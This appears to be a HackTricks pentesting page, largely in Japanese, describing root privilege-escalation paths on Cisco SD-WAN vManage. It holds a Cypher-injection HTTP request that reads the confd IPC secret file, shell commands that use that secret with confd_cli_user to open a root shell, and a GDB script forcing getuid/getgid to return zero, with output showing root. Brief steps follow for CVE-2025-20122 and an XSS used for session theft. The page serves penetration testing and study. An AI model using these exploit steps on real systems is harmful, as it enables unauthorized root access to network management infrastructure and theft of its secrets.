# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

## パス 1

(例: [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

`confd` と各種バイナリに関連するいくつかの[documentation](http://66.218.245.39/doc/html/rn03re18.html)を少し調べたところ（Cisco のウェブサイトのアカウントでアクセス可能）、IPC ソケットの認証には `/etc/confd/confd_ipc_secret` にあるシークレットを使用していることが判明しました:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
前に扱った Neo4j インスタンスを覚えていますか？それは `vmanage` ユーザーの権限で実行されているため、前の vulnerability を使ってファイルを取得できます：
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` プログラムはコマンドライン引数をサポートしていませんが、引数付きで `/usr/bin/confd_cli_user` を呼び出します。したがって、`/usr/bin/confd_cli_user` を自分の引数で直接呼び出すことができます。ただし現在の権限では読み取れないため、rootfs から取得して scp でコピーし、ヘルプを読んでそれを使ってシェルを取得する必要があります:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## パス 2

(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv チームによるブログ¹は root シェルを得る巧妙な方法を説明していましたが、問題は `/usr/bin/confd_cli_user` のコピーを入手する必要があり、それは root にしか読み取りできない点です。私はその面倒を避けて root に昇格する別の方法を見つけました。

When I disassembled `/usr/bin/confd_cli` binary, I observed the following:

<details>
<summary>Objdump による UID/GID の取得表示</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

“ps aux”を実行すると、次のような出力が観察されました（_note -g 100 -u 107_）
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
私は、`confd_cli` プログラムがログインユーザーから取得した UID と GID を “cmdptywrapper” アプリケーションに渡しているのではないかと仮定した。

まずは “cmdptywrapper” を直接実行し、`-g 0 -u 0` を渡してみたが失敗した。どこかでファイルディスクリプタ（-i 1015）が作成されており、それを偽装できないようだ。

synacktiv のブログ（最後の例）で触れられているように、`confd_cli` プログラムはコマンドライン引数をサポートしていないが、デバッガで影響を与えることはできる。幸いシステムには GDB が含まれている。

`getuid` と `getgid` を 0 を返すよう強制する GDB スクリプトを作成した。既に deserialization RCE を通じて “vmanage” 権限を持っているため、`/etc/confd/confd_ipc_secret` を直接読む権限がある。

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
コンソール出力:

<details>
<summary>コンソール出力</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## パス3（2025 CLI入力検証バグ）

CiscoはvManageを*Catalyst SD-WAN Manager*に改名しましたが、基盤となるCLIは同じボックス上で引き続き動作します。2025年のアドバイザリ（CVE-2025-20122）は、CLIの入力検証不足により、マネージャのCLIサービスに細工したリクエストを送信することで**任意の認証済みローカルユーザ**がrootを取得できると説明しています。任意の低権限フットホールド（例：Path1のNeo4jデシリアライズ、あるいはcron/backupユーザのシェル）をこの脆弱性と組み合わせることで、`confd_cli_user`をコピーしたりGDBをアタッチしたりせずにrootに昇格できます:

1. 低権限のシェルを使ってCLIのIPCエンドポイントを特定します（通常はPath2に示されたポート4565の`cmdptywrapper`リスナ）。
2. UID/GIDフィールドを0に偽造するCLIリクエストを作成します。検証バグにより元の呼び出し元のUIDが強制されないため、ラッパはroot権限のPTYを起動します。
3. `vshell; id` のような任意のコマンド列を偽造したリクエスト経由で流し、rootシェルを取得します。

> このエクスプロイトの対象はローカル限定です；最初のシェルを得るためにはリモートコード実行が依然として必要ですが、一旦ボックス内に入るとエクスプロイトはデバッガでのUID書き換えではなく単一のIPCメッセージで済みます。

## 他の最近のvManage/Catalyst SD-WAN Manager脆弱性（連鎖用）

* **Authenticated UI XSS (CVE-2024-20475)** – Inject JavaScript in specific interface fields; stealing an admin session gives you a browser-driven path to `vshell` → local shell → Path3 for root.

## References

- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)

{{#include ../../banners/hacktricks-training.md}}
